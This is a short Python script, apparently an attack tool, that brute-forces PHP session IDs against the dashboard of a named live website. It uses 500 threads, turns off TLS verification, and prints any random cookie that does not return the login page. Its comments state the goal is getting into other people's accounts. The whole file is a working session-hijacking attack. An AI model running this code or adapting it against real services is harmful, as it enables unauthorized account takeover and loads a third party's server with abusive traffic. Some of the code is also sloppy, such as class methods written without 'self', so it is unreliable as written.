# File: malicious.py
# Author: pwd0kernel
# Date: 4/20/2021
# Description: malicious/bugs/vulns commands

import requests
import warnings
import threading
import random
from bs4 import BeautifulSoup

class Malicious():

    bruteforce_threads = []

    # this will try to brutefoce
    # the phpsessid of otehr peoples Account
    # but it could take a long while because
    # there isnt a lot of buyers
    def PHPSIDBrute_function():
        try:
            while True:
                try:
                    code = ''.join(
                        (random.choice('zxcvbnmasdfghjklqwertyuiop1234567890') for i in range(26)))
                    ss = requests.Session()
                    check_url = ss.get(
                        "https://lynx.rip/dashboard/home/", cookies=dict(PHPSESSID=code), verify=False)
                    if "Login page example" in check_url.text:
                        pass
                    else:
                        print(code)
                        print(ss.cookies.get_dict())
                except Exception:
                    pass
        except Exception:
            print("There was an error with PHPSIDBrute.")
        pass

    def PHPSIDBruteForce():
        for i in range(500):
            brute = threading.Thread(target=PHPSIDBrute_function)
            brute.daemon = False
            bruteforce_threads.append(brute)
        for i in range(500):
            bruteforce_threads[i].start()
        for i in range(500):
            bruteforce_threads[i].join()